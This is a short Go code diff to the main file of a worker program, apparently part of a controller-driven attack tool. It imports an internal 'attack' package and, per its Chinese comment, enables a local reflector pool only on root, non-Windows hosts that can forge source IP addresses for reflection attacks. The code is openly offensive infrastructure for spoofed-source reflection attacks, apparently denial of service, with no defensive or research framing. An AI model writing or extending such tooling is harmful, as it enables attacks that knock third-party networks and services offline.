@@ -12,6 +12,7 @@ import (
 	"strings"
 	"syscall"
 
+	"newtool/internal/attack"
 	"newtool/internal/worker"
 )
 
@@ -105,11 +106,17 @@ func main() {
 	w := worker.New(workerID, *controllerAddr, *authToken, proxySource, 0)
 	w.SetHTTPPort(*httpPort)
 
-	// 默认启用本地池
-	if err := w.EnableLocalPool(location); err != nil {
-		log.Fatalf("Failed to enable local pool: %v", err)
+	// 反射器攻击必须伪造源 IP：平台级预判（Windows / 非 root / 编译平台
+	// 不支持）时本地反射器池毫无意义，直接跳过创建（连 SQLite 库都不建）。
+	// 真正能力仍由 spoof-probe 探测最终确认（见 worker.Run）。
+	if !worker.IsWindows() && worker.IsRoot() && attack.SupportsSpoofing() {
+		if err := w.EnableLocalPool(location); err != nil {
+			log.Fatalf("Failed to enable local pool: %v", err)
+		}
+		log.Printf("  Local pool:  enabled")
+	} else {
+		log.Printf("  Local pool:  skipped (IP spoofing unavailable on this platform)")
 	}
-	log.Printf("  Local pool:  enabled")
 
 	if err := w.Connect(); err != nil {
 		log.Fatalf("Failed to connect: %v", err)
